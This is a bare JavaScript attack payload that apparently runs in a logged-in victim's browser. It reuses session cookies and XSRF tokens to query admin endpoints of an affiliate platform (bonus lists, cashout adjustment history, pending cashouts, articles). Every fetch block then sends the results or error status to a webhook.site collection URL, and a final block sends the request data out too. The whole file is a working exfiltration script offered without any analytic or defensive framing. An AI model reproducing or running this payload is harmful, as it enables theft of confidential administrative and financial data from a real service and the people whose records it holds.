fetch('https://affiliates-api.ggpartners.com/api2/admin/bonuses/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?bonus="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?bonus="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/bonuses/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?bonusr="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?bonuse="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});


fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/adjustment_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affl="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/adjustment_history/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?afll="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});




fetch('https://affiliates-api.ggpartners.com/api2/admin/affiliate_cashouts/pending_cashouts/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affl="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/affiliate_cashouts/pending_cashouts/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?affl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?afll="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});


fetch('https://affiliates-api.ggpartners.com/api2/admin/articles/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?artl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?artl="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server

  
});

fetch('https://affiliates-api.ggpartners1.com/api2/admin/articles/list', {
  method: 'POST', // Specify the HTTP method as POST
  credentials: 'include',
  mode: 'cors',
  headers: {
        "X-XSRF-TOKEN": getCookie("XSRF-TOKEN-X"), 
    "XSRF-TOKEN": getCookie("XSRF-TOKEN-X"),
        "Content-Type": "application/json",
    "Access-Control-Allow-Credentials": true,
"Access-Control-Allow-Origin": "*",
    "X-Http-Method-Override": "POST"
      },
  body: JSON.stringify(dataToSend) // Convert the JavaScript object to a JSON string
})
.then(response => {
  if (!response.ok) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?artl="+response.status, false ); // false for synchronous request
    xmlHttp.send( null );
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  a = response.json(); // Parse the JSON response from the server
 const jsonString = JSON.stringify(a );
  var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030?artl="+jsonString, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
})
.then(data => {
  console.log('Success:', data);
})
.catch(error => {
  a = error.json(); // Parse the JSON response from the server
});


(async () => {
   let response = await new Promise(resolve => {
      var xhr = new XMLHttpRequest();
      xhr.open("GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?a="+JSON.stringify(dataToSend), true);
      xhr.withCredentials = true;
      xhr.onload = function(e) {
        var xmlHttp1 = new XMLHttpRequest();
        xmlHttp1.open( "GET", "https://webhook.site/39c4924c-07d7-42ef-b86f-69a190704030/?adm="+xmlHttp.responseText, false ); // false for synchronous request
        xmlHttp1.send( null );
      };
      xhr.onerror = function () {
        resolve(undefined);
        console.error("** An error occurred during the XMLHttpRequest");
      };
      xhr.send();
   }) 
})();
